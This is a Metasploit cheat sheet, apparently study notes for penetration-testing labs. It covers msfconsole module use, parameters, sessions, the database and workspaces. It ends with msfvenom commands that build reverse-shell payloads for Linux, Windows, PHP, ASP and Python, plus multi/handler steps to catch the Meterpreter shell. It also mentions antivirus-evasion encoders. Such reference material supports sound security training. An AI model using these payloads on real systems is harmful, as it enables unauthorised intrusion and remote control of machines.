# Metasploit Cheat Sheet

**`msfconsole`** 

Reminders:

- Has tab completion
- some Linux commands don’t work (like output redirection)
- Context settings (like RHOSTS) are not global unless set with `setg`
- meterpreter = post-exploit payload shell
- `-h` is a great command flag

**Simple HTTP server:**

`python3 -m http.server 9000`

### **Context**

`use <module-name|module-index>` - Loads a module 
(ex: `use exploit/windows/smb/ms17_010_eternalblue`)

`show options` - Lists parameters for the loaded module

`show payloads` - Lists all payloads or those compatible for chosen exploit

`back` - Exit the module context

`info <module-name|module-index>` - Detailed information on the loaded module

### **Modules Searching**

- `search <keyword>` - Searches by CVE, name, or description.
- Filters:
    - `type:<auxiliary|exploit|post|payload>`
    - `platform:<windows|linux|unix>`
    - `cve:<CVE-ID>`
- Example: `search type:auxiliary telnet`

**Exploit Ranking** (Reliability) - [https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

### Setting Parameters

- **`set <parameter> <value>`** - Set <value> for current module only.
- **`setg <parameter> <value>`** - Set global <value> (applies to all modules).
- **`unset <parameter>`** - Remove a set value.
- **`unset all`** - Clear all parameters for current module.
- **`unsetg <parameter>`** - Clear global value.
- don’t forget to `set payload <name|index>`

### Common Parameters

- RHOSTS - Target IP, range, CIDR, or file:/path/to/file.txt
- RPORT - Target port (default depends on module)
- PAYLOAD - Code to run after exploitation
- LHOST - Attacker’s IP (listener)
- LPORT - Attacker’s port for reverse connection
- SESSION - Session ID for post-exploitation modules

### **Running Modules**

- **`exploit`** - Run module
- **`exploit -z`** - Run and background the session immediately
    - **`background`** or **CTRL+Z** - Send active session to background
    - **`sessions`** - List active sessions
    - **`sessions -i <id>`** - Interact with a session
- **`run`** - Same as `exploit` but  for non-exploit modules
- **`check`** - Test if target is vulnerable without exploiting

### Categories of Modules

Auxiliary - Supporting functions (scanners, crawlers, fuzzers, sniffers, spoofing, SQLi, VoIP, etc.).

Encoders - Encode payloads to attempt antivirus evasion (limited success).

Evasion - Modules specifically designed to bypass antivirus/defensive measures.

Exploits - Organized by target OS/platform (Windows, Linux, macOS, etc.).

NOPs - No-operation instructions (buffers for payload size consistency).

Post - Modules for post-exploitation (privilege escalation, data collection, persistence).

Payloads - Code executed on target:

Adapters - Convert payloads into other formats (e.g., PowerShell).

Singles - Self-contained payloads (no extra downloads).

Stagers - Set up connection channel for staged payloads.

Stages - Main payload delivered by stager (can be larger/more complex).

### Metasploit Database Setup

1. Start PostgreSQL:

`systemctl start postgresql`

1. Initialize Database (run as *postgres* user):

`sudo -u postgres msfdb init`

1. Delete Existing DB (optional):

`sudo -u postgres msfdb delete`

1. Check Status in msfconsole:

msf6> `db_status`

### **Database Commands**

- `db_nmap` – Run Nmap & save results to DB
- `hosts` – List discovered hosts
    - `hosts -R` → Populate `RHOSTS` parameter with all hosts in DB
    - `-h` for addition flags
- `services` – List discovered services
    - `services -S <service>` → Filter by service name
    - `-h` for addition flags
- `loot` – List collected files/data
- `vulns` – List recorded vulnerabilities

### **Workspaces**

- **List**: `workspace`
- **Add**: `workspace -a <name>`
- **Delete**: `workspace -d <name>`
- **Switch**: `workspace <name>`
- **Help**: `workspace -h`

## Msfvenom

- List payloads:

`msfvenom -l payloads`

- List formats:

`msfvenom --list formats`

- List encoders:

`msfvenom -l encoders`

- Basic Payload Generation

`msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<port> -f <format> -e <encoders> > <filename>`

**Payload Generation Examples:**

- Linux ELF:

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`

- Windows EXE:

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`

- PHP:

`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`

*cat into the output file and append  PHP tags:* `<?php` & `?>`

- ASP:

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`

- Python:

`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw -e php/base64 > rev_shell.py`

### **Setting up a Listener (Multi/Handler)**

*manual setup for standalone payloads (created above or script kiddie’d elsewhere)*

`use exploit/multi/handler`

`set payload <same_payload_used_in_msfvenom>`

`set lhost <attacker_ip>`

`set lport <port>`

`run`

Now get target to run the payload to catch a Meterpreter shell :)